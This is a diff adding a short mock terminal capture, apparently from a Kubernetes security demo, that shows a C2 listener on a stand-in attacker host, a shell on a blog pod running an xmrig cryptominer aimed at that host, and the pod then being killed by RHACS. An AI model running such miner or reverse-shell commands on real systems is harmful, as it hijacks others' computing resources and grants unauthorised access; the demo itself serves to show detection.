@@ -1,0 +1,7 @@
+[1m[31m☠  C2 listening on attacker.example.local:4444[0m
+
+[+] shell on blog-84c9b5fdc8-qg2sz at 13:36:45
+   42 /tmp/.cache/xmrig -o stratum+tcp://attacker.example.local:3333 --donate-level 0
+   58 /bin/sh
+
+[2m… RHACS kills the pod: the shell goes silent. Every command typed now goes nowhere.[0m
